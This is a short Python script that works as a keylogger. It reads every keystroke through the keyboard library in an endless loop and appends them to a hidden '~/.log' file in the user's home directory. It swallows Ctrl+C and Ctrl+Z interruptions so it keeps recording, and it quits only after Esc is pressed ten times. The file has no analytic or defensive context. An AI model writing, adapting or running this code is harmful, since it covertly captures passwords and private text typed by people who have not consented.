import keyboard
import time
import os.path
import os


def main():

    attempt = 0
    
    # It's your choice to change '~' as the currect directory of the file.
    # ".log", is the defualt filename, where every keystroke of the user stores it.
    f = open(os.path.expanduser('~') + os.sep + ".log", 'a')

    time_today = time.strftime(str('%c'), time.localtime())

    print("{0} [{1}] {0}\n".format('-' * 20, time_today), file=f)

    while 1:
        try:
            key_value = keyboard.read_hotkey(False)
            
            # "esc" is the terminator default, as it presses 10 times (default)
            if key_value == 'esc':
                attempt += 1

            if '+' in key_value and len(key_value) > 1:
                key_value = key_value.replace('+', '\n').replace("plus", "+").replace("shift", "").replace("alt", "").replace(" ", "space")
            
            # You can change the attempt, as much as you like
            if attempt == 10:
                exit()

        # This exception, makes the program safer against KeyboardInterrupt (Ctrl+C) and/or EOFError (Ctrl+Z)
        except:
            continue

        finally:
            # This simply writes the value in the "~/.log" as the default directory of line 9.
            print(key_value, file=f)


if __name__ == "__main__":
    main()